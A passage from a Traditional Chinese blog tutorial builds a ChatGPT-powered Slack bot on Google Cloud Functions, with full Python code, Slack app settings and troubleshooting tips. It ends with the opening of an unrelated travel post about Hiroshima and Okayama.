忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': print(payloadType) callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看:成功！當我們完成 停止 OpenAI API Shortcut 之後，正在產生的回應就會終止，並回應 [已終止] 。 另外相同原理，你也可以建立一個刪除訊息的 Shortcut，實作刪除 Slack App 所發出的訊息。同個討論串(Threads) 增加上下文(Context) 功能如果在同個討論串下再發送新訊息，可以當成是同個問題的再次追問，此時可以加上一個功能，為新的 prompt 補上前面對話內容。補上 slackGetReplies &amp; 將內容填充到 OpenAI API Prompt：完善 Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut (訊息) if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventTS, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # 如果是 Slac App (OpenAI API Response) 則標示為 assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # 使用者的訊息內容標為 user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看: 左圖為原本沒有補上 Context 時再追問問題，會是全新的對話。 右圖是加上補上 Context 後就能理解整個對話情境跟新的問題。完成！至此我們已經自己打造了一個 ChatGPT (via OpenAI API) Slack App Bot 機器人。 您也可以依照自己的需求參考 Slack API 與 OpenAI API Custom instructions 在 Cloud Functions Python 程式中進行搭配，例如訓練一個頻道專門回答團隊問題與查找專案文件、一個頻道專門負責翻譯、一個頻道專門分析數據…等等。補充在 1:1 訊息之外，標記機器人回答問題 可以在任一頻道(需要將機器人加入頻道)標記機器人請他回答問題首先需要增加 app_mention Event Subscription：加入完成-&gt;「Save Changes」儲存完成-&gt;「reinstall your app」完成。在上述的 main.py 程式 #Handle Event Subscriptions Events…Code Block 中加入新的 Event Type 判斷： # 提及類 Event (@SlcakApp 你好) if eventType == 'app_mention': # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容，移除開頭標記字串 &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)部署後，即可完成。Slack App 刪除所發的訊息您無法直接在 Slack 上刪除 Slack App 發出的訊息，可以參考上述「 停止 OpenAI API 產生回應 」Shortcut 方式，新增一個「刪除訊息」Shortcut。並在 Cloud Functions main.py 程式中：# 處理 Shortcut Code Block 新增一個 callback_id 判斷，判斷等於你定的「刪除訊息」Shortcut Callback ID 然後將參數帶入以下方法，即可完成刪：def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responseSlack App 沒反應 檢查 Token 是否正確 查看 Cloud Functions Logs 是否有錯誤 Cloud Functions 是否部署完成 Slack App 是否在你發問的頻道(如非與 Slack App 1:1 的對話頻道要把機器人加入頻道才會生效) 在 SlackRequest 方法下 Log 紀錄 Slack API ResponseCloud Functions Public URL 不夠安全 如果怕 Cloud Functions URL 不夠安全，可以自己加上 query token 驗證SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 驗證 token 參數是否合法 if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers)Cloud Functions 相關問題計費方式不同區域、CPU、RAM、容量、流量…價格不一樣，請參考 官方計價 表。免費額度 如下：(2024/02/15)Cloud Functions 針對運算時間資源提供永久免費方案，當中包括 GB/秒和 GHz/秒的分配方式。除了 200 萬次叫用以外，這個免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路資料傳輸量。免費方案的使用額度，是以上述級別 1 價格的同等美元金額計算。無論執行函式的區域採用的是級別 1 和/或級別 2 價格，系統都會分配同等美元金額給您。不過在扣除免費方案的額度時，系統將以函式執行區域的級別 (級別 1 或級別 2) 為準。請注意，即便您採用的是免費方案，也必須擁有有效的帳單帳戶。 btw. .Slack App 免費、不限一定要 Premium 才能使用。Slack App 回應太慢、太久 Timeout(撇除 OpenAI API 高峰時間回應較慢問題) ，如果是 Cloud Function 貧頸，可在 Cloud Function 編輯器第一頁展開設定：可調整 CPU、RAM、Timeout 時間、Concurrent 數量…提升處理請求速度。 *但可能會需要計費開發階段 Testing &amp; Debug點擊「Test Function」就會跑出 Cloud Shell 視窗在下方工具列，等待約 3–5 分鐘(第一次啟動較久)，Build 完成並同意以下授權後：看到出現「Function is ready to test」後即可點擊「Run Test」執行方法 Debug 測試。可使用右方「Triggering event」區塊輸入 JSON Body 會帶入 request_json 參數進行測試，或直接改程式 inject test object 進行測試。 *請注意 Cloud Shell/Cloud Run可能有延伸費用。 建議部署(Deploy)前都先跑一次測試看看，至少確保 Build 能成功。Build 失敗，程式碼不見了該怎麼辦？如果不小心寫錯程式造成 Cloud Function Deploy Build Failed，會出現錯誤提示，此時點擊「EDIT AND REDEPLOY」回到 編輯器後會發現剛剛改的 Code 都不見了！！！無須擔心，此時點擊左方「Source Code」選擇「Last Failed Deployment」就能恢復剛剛 Build Failed 的 Code：查看執行階段 print Logs *請注意 Cloud Logging、Query 查詢 Logs 可能有延伸費用。最終程式碼 (Python 3.8)Cloud Functionsmain.py ：import functions_frameworkimport requestsimport reimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 自己定義的安全驗證 Token# 網址需帶上 ?token=SAFE_ACCESS_TOKEN 參數才會接受請求 SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries # print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 驗證 token 參數是否合法 if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers) # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] # 訊息類 Event if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 提及類 Event (@SlcakApp 你好) if eventType == 'app_mention': # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容，移除開頭標記字串 &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut (訊息) if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) # 如果是 刪除訊息 if callbackID == \"delete_message\": slackDeleteMessage(channel, ts) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"刪除 Slack App 訊息成功!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventChannel, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # 如果是 Slac App (OpenAI API Response) 則標示為 assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # 使用者的訊息內容標為 user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responsedef slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return Nonerequirements.txt ：functions-framework==3.*requests==2.31.0openai==1.9.0Slack App 設定OAuth &amp; Permissions 刪除按鈕反灰的項目是加入 Shortcut 後 Slack 自動補上的權限。Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Subscribe to bot events:Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Shortcuts:App Home Always Show My Bot as Online: Enable Messages Tab: Enable Allow users to send Slash commands and messages from the messages tab: ✅Basic Information Rick &amp; Morty 🤘🤘🤘Reddit工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 806 Total Views Last Statistics Date: 2025-01-19 | 791 Views on Medium. " }, { "title": "遊記 2023 山陽地區 廣島岡山 6 日自由行", "url": "/posts/31b9b3a63abc/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel, hiroshima, okayama", "date": "2024-01-09 21:27:40 +0800", "snippet": "[遊記] 2023 山陽地區 廣島岡山 6 日自由行2023 廣島、岡山、福山、倉敷、尾道 6 日遊前言8 月底離職後隨即在 9 月出發「 九州 10 日漫步獨旅 」休息了快三個月之後，原本預計 11 月中上班，新工作到職後就要展開新專案、新公司無多特休，一切要照基本勞基法重新累積年假，因此考慮再出去玩一次 (10 月底開始計劃)。2024/11/03 Update: [遊記] 2024 ...", "content": "[遊記] 2023 山陽地區 廣島岡山 6 日自由行2023 廣島、岡山、福山、倉敷、尾道 6 日遊前言8 月底離職後隨即在 9 月出發「 九州 10 日漫步獨旅 」休息了快三個月之後，原本預計 11 月中上班，新工作到職後就要展開新專案、新公司無多特休，一切要照基本勞基法重新累積年假，因此考慮再出去玩一次 (10 月底開始計劃)。2024/11/03 Update: [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行2024 去了山陰地區，有時間的朋友也可以考慮山陽＋山陰一起玩！地點 — 廣島(岡山)上次去 長崎路上的 意外小插曲 — 獲得一個( 廣島縣 )三原市おみやげ 加上上次去長崎參觀了核爆紀念館、和平公園，想說 廣島 的也可以去看看。還有身邊朋友也都推薦 廣島 ，有世界遺產 — 嚴島神社、牡蠣、瀨戶內海、尾道、兔島…加上同樣是獨旅，不考慮大城市及已經去過的城市、希望交通方便， 廣島 就是一個很好的選擇！日期 — 11/13–18原本預計 11/20(一) 上班(後來延到 12/1)，扣掉最後一天緩衝休息，回程日期就訂在 11/18 (六) 了。去程日期，原本 11/12 與朋友有約，因此先抓 11/13(週一) 